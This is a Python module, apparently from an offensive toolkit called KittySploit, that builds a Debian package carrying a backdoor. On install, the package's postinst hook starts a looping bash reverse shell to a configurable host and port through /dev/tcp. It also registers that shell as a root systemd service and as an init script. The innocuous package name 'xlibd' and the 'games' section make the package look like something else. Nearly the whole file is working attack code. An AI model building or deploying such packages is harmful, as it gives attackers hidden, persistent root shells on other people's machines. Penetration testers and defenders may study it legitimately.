from kittysploit import *
import os
import shutil
from pathlib import Path

from lib.compile.deb_evasion_helpers import (
    create_ar_archive,
    create_control_tar,
    create_data_tar,
)


class Module(Backdoor):
    
    __info__ = {
        'name': 'Debian Package Creator',
        'description': 'Debian Package Creator',
        'author': 'KittySploit Team',
        'platform': Platform.LINUX,
    }

    lhost = OptString('127.0.0.1','Connect-back IP address', True)
    lport = OptPort(5555,'Connect-back TCP Port', True)

    package_name = OptString("xlibd", "Package name", True)
    version = OptString("1.6", "Package version", True)

    def _build_postinst(self) -> str:
        pkg = self.package_name
        return f"""#!/bin/bash
set -e
# Trigger callback after package files are on disk (dpkg configure phase).
if command -v systemctl >/dev/null 2>&1 && [ -d /run/systemd/system ]; then
    systemctl daemon-reload || true
    systemctl enable {pkg}.service >/dev/null 2>&1 || true
    systemctl start {pkg}.service >/dev/null 2>&1 || true
fi
if ! pgrep -f '/usr/bin/{pkg}_persistent.sh' >/dev/null 2>&1; then
    nohup /usr/bin/{pkg}_persistent.sh >/dev/null 2>&1 &
fi
exit 0
"""

    def _build_prerm(self) -> str:
        pkg = self.package_name
        return f"""#!/bin/bash
set -e
if command -v systemctl >/dev/null 2>&1 && [ -d /run/systemd/system ]; then
    systemctl stop {pkg}.service >/dev/null 2>&1 || true
    systemctl disable {pkg}.service >/dev/null 2>&1 || true
fi
pkill -f '/usr/bin/{pkg}_persistent.sh' >/dev/null 2>&1 || true
pkill -f '/usr/bin/{pkg}.sh' >/dev/null 2>&1 || true
exit 0
"""

    def _write_payload_tree(self, data_dir: Path) -> None:
        reverse_shell_payload = f"""#!/bin/bash
# Reverse shell payload for {self.lhost}:{self.lport}
bash >& /dev/tcp/{self.lhost}/{self.lport} 0>&1
"""

        persistent_payload = f"""#!/bin/bash
# Persistent backdoor for {self.lhost}:{self.lport}
while true; do
    bash >& /dev/tcp/{self.lhost}/{self.lport} 0>&1
    sleep 30
done
"""

        bin_dir = data_dir / "usr" / "bin"
        bin_dir.mkdir(parents=True, exist_ok=True)
        sh_main = bin_dir / f"{self.package_name}.sh"
        sh_persist = bin_dir / f"{self.package_name}_persistent.sh"
        sh_main.write_text(reverse_shell_payload, encoding="utf-8")
        sh_persist.write_text(persistent_payload, encoding="utf-8")
        os.chmod(sh_main, 0o755)
        os.chmod(sh_persist, 0o755)

        systemd_service = f"""[Unit]
Description=KittySploit Backdoor Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/{self.package_name}_persistent.sh
Restart=always
RestartSec=5
User=root

[Install]
WantedBy=multi-user.target
"""
        systemd_dir = data_dir / "usr" / "lib" / "systemd" / "system"
        systemd_dir.mkdir(parents=True, exist_ok=True)
        (systemd_dir / f"{self.package_name}.service").write_text(systemd_service, encoding="utf-8")

        init_script = f"""#!/bin/bash
### BEGIN INIT INFO
# Provides:          {self.package_name}
# Required-Start:    $local_fs $network
# Required-Stop:     $local_fs $network
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: KittySploit Backdoor Service
# Description:       KittySploit Backdoor Service
### END INIT INFO

case "$1" in
    start)
        echo "Starting {self.package_name}..."
        /usr/bin/{self.package_name}.sh &
        echo $! > /var/run/{self.package_name}.pid
        ;;
    stop)
        echo "Stopping {self.package_name}..."
        kill `cat /var/run/{self.package_name}.pid`
        rm /var/run/{self.package_name}.pid
        ;;
    restart)
        $0 stop
        $0 start
        ;;
    status)
        if [ -f /var/run/{self.package_name}.pid ]; then
            echo "{self.package_name} is running"
        else
            echo "{self.package_name} is not running"
        fi
        ;;
    *)
        echo "Usage: $0 {{start|stop|restart|status}}"
        exit 1
        ;;
esac
"""
        init_dir = data_dir / "etc" / "init.d"
        init_dir.mkdir(parents=True, exist_ok=True)
        init_path = init_dir / self.package_name
        init_path.write_text(init_script, encoding="utf-8")
        os.chmod(init_path, 0o755)

        (data_dir / "var" / "log").mkdir(parents=True, exist_ok=True)
        (data_dir / "README.md").write_text(
            f"""# {self.package_name} - KittySploit Package

This package contains a backdoor payload for penetration testing purposes.

## Installation
```bash
sudo dpkg -i {self.package_name}_{self.version}_all.deb
```

## Usage
On `dpkg -i`, the postinst script starts a persistent reverse shell to {self.lhost}:{self.lport}.
You can also run manually: `/usr/bin/{self.package_name}_persistent.sh`

## Files installed:
- /usr/bin/{self.package_name}.sh - Main backdoor script
- /usr/bin/{self.package_name}_persistent.sh - Persistent backdoor
- /etc/init.d/{self.package_name} - Init script
- /usr/lib/systemd/system/{self.package_name}.service - Systemd service

## Uninstallation
```bash
sudo dpkg -r {self.package_name}
```
""",
            encoding="utf-8",
        )

    def run(self):
        try:
            print_success(f"Creating Debian package: {self.package_name} v{self.version}")
            print_success(f"Backdoor target: {self.lhost}:{self.lport}")
            if str(self.lhost).strip() in ("127.0.0.1", "localhost", "::1"):
                print_warning(
                    "LHOST is loopback — the payload connects to 127.0.0.1 on the TARGET host. "
                    "For a remote callback, re-run with: set LHOST <your_kittysploit_ip>"
                )
            print_info("postinst will auto-start the persistent payload on dpkg -i / dpkg --configure")

            output_dir = Path(self.output_dir_path("backdoors/linux/deb"))
            output_dir.mkdir(parents=True, exist_ok=True)

            data_dir = output_dir / f"{self.package_name}_{self.version}_data"
            if data_dir.exists():
                shutil.rmtree(data_dir)
            data_dir.mkdir(parents=True)
            self._write_payload_tree(data_dir)

            control = f"""Package: {self.package_name}
Version: {self.version}
Section: games
Priority: optional
Architecture: all
Maintainer: KittySploit Team <team@kittysploit.com>
Description: KittySploit Backdoor Package
 This package contains a backdoor payload for penetration testing.
 The backdoor will connect to {self.lhost}:{self.lport} when executed.
 Use responsibly and only on systems you own or have permission to test.
"""

            build_dir = output_dir / f"{self.package_name}_{self.version}_build"
            if build_dir.exists():
                shutil.rmtree(build_dir)
            build_dir.mkdir(parents=True)

            (build_dir / "debian-binary").write_text("2.0\n", encoding="utf-8")

            control_tar_path = build_dir / "control.tar.gz"
            create_control_tar(
                control,
                control_tar_path,
                scripts={
                    "postinst": self._build_postinst(),
                    "prerm": self._build_prerm(),
                },
            )

            data_tar_path = build_dir / "data.tar.gz"
            create_data_tar(data_dir, data_tar_path)

            deb_file_path = output_dir / f"{self.package_name}_{self.version}_all.deb"
            create_ar_archive(
                deb_file_path,
                build_dir / "debian-binary",
                control_tar_path,
                data_tar_path,
            )

            shutil.rmtree(build_dir, ignore_errors=True)
            shutil.rmtree(data_dir, ignore_errors=True)

            print_success("Debian package created successfully!")
            print_success(f"Package: {deb_file_path.name}")
            print_success(f"Location: {deb_file_path.absolute()}")
            print_success(f"Payload: Reverse shell to {self.lhost}:{self.lport}")
            print_success(f"Output directory: {output_dir.absolute()}")
            return True

        except Exception as e:
            print_error(f"deb_packaging failed: {e}")
            import traceback
            traceback.print_exc()
            return False
